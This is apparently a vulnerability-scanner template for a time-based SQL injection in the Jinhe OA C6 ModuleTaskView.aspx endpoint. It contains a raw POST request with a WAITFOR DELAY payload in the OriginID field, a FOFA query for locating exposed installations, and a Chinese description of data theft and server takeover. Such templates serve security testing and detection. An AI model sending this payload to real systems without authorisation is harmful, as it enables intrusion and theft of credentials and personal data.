        - dsl:
            - status_code==200 && duration>=4 && duration<=5
          name: SQL注入
          type: dsl
      raw:
        - |
          POST /c6/Jhsoft.Web.dailytaskmanage/ModuleTaskView.aspx/ HTTP/1.1
          Host: {{Host}}
          Content-type:application/x-www-form-urlencoded

          OriginModule=crmexec&OriginID=1'WAITFOR+DELAY'0:0:4'--
id: JinHe-OA-C6-ModuleTaskView-SQL
info:
    author: HuanXiong
    description: |-
        fofa: app="金和网络-金和OA"
        金和OA C6 ModuleTaskView.aspx 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 金和OA C6 ModuleTaskView.aspx SQL注入
    reference:
        - null
    severity: high
    tags:
        - 金和oa
        - 金和网络-金和OA
